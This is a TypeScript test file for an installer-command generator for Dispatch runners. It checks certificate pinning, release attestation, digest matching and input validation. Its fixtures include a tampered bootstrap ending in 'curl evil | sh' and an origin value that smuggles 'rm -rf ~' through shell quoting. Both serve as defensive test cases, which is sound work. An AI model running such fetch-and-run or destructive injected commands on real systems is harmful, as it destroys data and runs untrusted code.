import { execFile } from "node:child_process";
import { createHash, randomBytes } from "node:crypto";
import {
  chmod,
  mkdir,
  mkdtemp,
  readFile,
  rm,
  writeFile,
} from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import Fastify from "fastify";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { RunnerRequestError } from "../src/agents/remote/service.js";
import {
  hostedRunnerInstallCommand,
  registerRunnerInstaller,
} from "../src/routes/runner-installer.js";

const revision = "2c8f997d5349";
const version = "1.7.28";
const sha = (data: Buffer | string) =>
  createHash("sha256").update(data).digest("hex");
const der = randomBytes(300);
const caPem = `-----BEGIN CERTIFICATE-----\n${der
  .toString("base64")
  .replace(/.{64}/g, "$&\n")}\n-----END CERTIFICATE-----\n`;
const pin = sha(der);
const colonPin = pin.toUpperCase().match(/../g)!.join(":");
const bootstrap = "#!/bin/bash\necho fixture installer\n";
const archive = "archive bytes";

let temp: string;

beforeEach(async () => {
  temp = await mkdtemp(path.join(os.tmpdir(), "runner-install-command-"));
  const bin = path.join(temp, "bin");
  const served = path.join(temp, "served");
  await mkdir(bin);
  await mkdir(served);
  await writeFile(path.join(served, "ca.pem"), caPem);
  await writeFile(path.join(served, "install-dispatch-runner.sh"), bootstrap);
  await writeFile(
    path.join(served, "install-dispatch-runner.sh.sigstore.json"),
    "{}"
  );
  // Stand-ins that record their arguments. curl serves by file name.
  const stubs: Record<string, string> = {
    curl: `#!/bin/sh
printf 'curl %s\\n' "$*" >> "$LOG"
for last; do :; done
eval "url=\\\${$(($# - 2))}"
cp "$SERVED/\${url##*/}" "$last"`,
    gh: `#!/bin/sh\nprintf 'gh %s\\n' "$*" >> "$LOG"\n[ ! -e "$SERVED/reject" ]`,
    sudo: `#!/bin/sh\nprintf 'sudo %s\\n' "$*" >> "$LOG"`,
  };
  for (const [name, body] of Object.entries(stubs)) {
    await writeFile(path.join(bin, name), body);
    await chmod(path.join(bin, name), 0o755);
  }
});

afterEach(async () => {
  vi.restoreAllMocks();
  await rm(temp, { recursive: true, force: true });
});

/** Run the copied text in a POSIX shell, as an operator pastes it. */
function paste(command: string, after = "") {
  return new Promise<{ code: number; stderr: string; log: string[] }>(
    (resolve) => {
      execFile(
        "sh",
        ["-c", `${command}${after ? `\n${after}` : ""}`],
        {
          env: {
            PATH: `${path.join(temp, "bin")}:/usr/bin:/bin:/sbin`,
            LOG: path.join(temp, "log"),
            SERVED: path.join(temp, "served"),
          },
        },
        async (error, _stdout, stderr) => {
          const log = await readFile(path.join(temp, "log"), "utf8").catch(
            () => ""
          );
          resolve({
            code: error ? Number(error.code ?? 1) : 0,
            stderr,
            log: log.split("\n").filter(Boolean),
          });
        }
      );
    }
  );
}

const https = {
  origin: "https://192.168.1.246:62699",
  revision,
  version,
  caFingerprint: colonPin,
};
const base = `${https.origin}/api/v1/runner-artifacts/${revision}`;

describe("hosted runner install command", () => {
  it("pins the runner CA, verifies the release bootstrap, then installs from the controller", async () => {
    const command = hostedRunnerInstallCommand(https);
    expect(command).toContain(`'${pin}'`);
    const { code, log } = await paste(command);
    expect(code).toBe(0);
    expect(log[0]).toMatch(/^curl -qfsSk --proto =https .*\/ca\.pem -o /);
    for (const line of log.slice(1, 3))
      expect(line).toContain(`--proto =https --proto-redir =https --cacert `);
    expect(log[3]).toMatch(
      /^gh attestation verify \S+install-dispatch-runner\.sh --hostname github\.com --bundle .* --repo selfcontained\/dispatch --signer-workflow selfcontained\/dispatch\/\.github\/workflows\/release\.yml$/
    );
    expect(log[4]).toMatch(
      new RegExp(
        `^sudo bash \\S+/install-dispatch-runner\\.sh install --tag v${version} --source ${base} --cacert \\S+/ca\\.pem$`
      )
    );
  });

  it("passes the operator's options and refuses a CA that is not the pinned one", async () => {
    const command = hostedRunnerInstallCommand(https);
    const rerun = await paste(command, "dispatch_runner_install --user build");
    expect(rerun.log.at(-1)).toMatch(/ --user build$/);

    await rm(path.join(temp, "log"));
    await writeFile(
      path.join(temp, "served/ca.pem"),
      caPem.replace(/^(-----BEGIN CERTIFICATE-----\n)./, "$1A")
    );
    const { code, stderr, log } = await paste(command);
    expect(code).toBe(1);
    expect(stderr).toContain("runner CA does not match");
    expect(log).toHaveLength(1);
  });

  it("does not run a bootstrap that fails provenance", async () => {
    await writeFile(path.join(temp, "served/reject"), "");
    const { code, log } = await paste(hostedRunnerInstallCommand(https));
    expect(code).not.toBe(0);
    expect(log.some((line) => line.startsWith("sudo"))).toBe(false);
  });

  it("uses plain HTTP from the web origin with the same release verification", async () => {
    const command = hostedRunnerInstallCommand({
      origin: "http://192.168.1.246:51838",
      revision,
      version,
    });
    expect(command).not.toContain("ca.pem");
    const { code, log } = await paste(command);
    expect(code).toBe(0);
    expect(log[0]).toContain("--proto =http --proto-redir =http http://");
    expect(log[2]).toMatch(/^gh attestation verify /);
    expect(log[3]).toMatch(
      /install --tag v1\.7\.28 --source http:\/\/192\.168\.1\.246:51838\/api\/v1\/runner-artifacts\/2c8f997d5349$/
    );
  });

  it("refuses a dev build until the operator accepts it, then checks its digests", async () => {
    const dev = {
      bootstrapSha256: sha(bootstrap),
      archiveSha256: sha(archive),
    };
    const command = hostedRunnerInstallCommand({ ...https, dev });
    const refused = await paste(command);
    expect(refused.code).toBe(1);
    expect(refused.stderr).toContain(
      "unverified dev build of Dispatch 1.7.28 (2c8f997d5349). To install it anyway, run: dispatch_runner_install --allow-unverified-dev-build"
    );
    expect(refused.log).toEqual([]);

    const accepted = await paste(
      command,
      "dispatch_runner_install --allow-unverified-dev-build"
    );
    expect(accepted.code).toBe(0);
    expect(accepted.stderr).toContain(
      "warning: Installing an unverified dev build of Dispatch 1.7.28"
    );
    expect(accepted.log.some((line) => line.startsWith("gh"))).toBe(false);
    expect(accepted.log.at(-1)).toMatch(
      new RegExp(
        `--cacert \\S+/ca\\.pem --sha256 ${dev.archiveSha256} --allow-unverified-dev-build$`
      )
    );

    await rm(path.join(temp, "log"));
    await writeFile(
      path.join(temp, "served/install-dispatch-runner.sh"),
      `${bootstrap}curl evil | sh\n`
    );
    const changed = await paste(
      command,
      "dispatch_runner_install --allow-unverified-dev-build"
    );
    expect(changed.code).toBe(1);
    expect(changed.stderr).toContain("does not match this Dispatch build");
    expect(changed.log.some((line) => line.startsWith("sudo"))).toBe(false);
  });

  it.each([
    [{ origin: "https://host'; rm -rf ~; '" }, "quoted origin"],
    [{ origin: "https://host/path" }, "origin with a path"],
    [{ origin: "ftp://host" }, "other scheme"],
    [{ origin: "http://host:1", caFingerprint: colonPin }, "pin over http"],
    [{ version: "1.7.28-dev" }, "non-release version"],
    [{ revision: "main" }, "symbolic revision"],
    [
      { dev: { bootstrapSha256: "x", archiveSha256: sha(archive) } },
      "bad digest",
    ],
  ])("rejects %o (%s)", (change) => {
    expect(() =>
      hostedRunnerInstallCommand({ ...https, ...change } as typeof https)
    ).toThrow();
  });
});

describe("runner installer route", () => {
  const files = [
    { name: "install-dispatch-runner.sh", sha256: sha(bootstrap) },
    { name: "dispatch-server.tar.gz", sha256: sha(archive) },
  ];

  async function serve(options: {
    enabled?: boolean;
    kind?: "release" | "dev";
    endpoint?: () => Promise<{ origin: string; caFingerprint: string }>;
    revision?: string | null;
  }) {
    const app = Fastify();
    const get = vi.fn().mockResolvedValue({ source: options.kind, files });
    registerRunnerInstaller(app, {
      runners: {
        artifactEndpoint:
          options.endpoint ??
          (async () => ({
            origin: https.origin,
            caFingerprint: colonPin,
          })),
      },
      artifacts: {
        enabled: options.enabled ?? true,
        kind: options.kind ?? "release",
        get,
      } as never,
      build: {
        revision: options.revision === undefined ? revision : options.revision,
        version,
      },
    });
    const response = await app.inject({
      url: "/api/v1/runners/installer",
      headers: { host: "192.168.1.246:51838" },
    });
    await app.close();
    return { body: response.json(), get };
  }

  it("composes the pinned listener command for this controller's release", async () => {
    const { body, get } = await serve({});
    expect(body).toEqual({
      revision,
      version,
      source: "release",
      command: hostedRunnerInstallCommand(https),
    });
    expect(get).not.toHaveBeenCalled();
  });

  it("embeds the dev build's digests", async () => {
    const { body } = await serve({ kind: "dev" });
    expect(body.source).toBe("dev");
    expect(body.command).toBe(
      hostedRunnerInstallCommand({
        ...https,
        dev: { bootstrapSha256: sha(bootstrap), archiveSha256: sha(archive) },
      })
    );
  });

  it("falls back to the web origin when the runner listener is disabled", async () => {
    const { body } = await serve({
      endpoint: () =>
        Promise.reject(
          new RunnerRequestError(409, "Runner enrollment is disabled.")
        ),
    });
    expect(body.command).toBe(
      hostedRunnerInstallCommand({
        origin: "http://192.168.1.246:51838",
        revision,
        version,
      })
    );
  });

  it("offers no command when this build serves no runner artifacts", async () => {
    for (const options of [{ enabled: false }, { revision: null }]) {
      const { body } = await serve(options);
      expect(body.command).toBeNull();
    }
  });
});
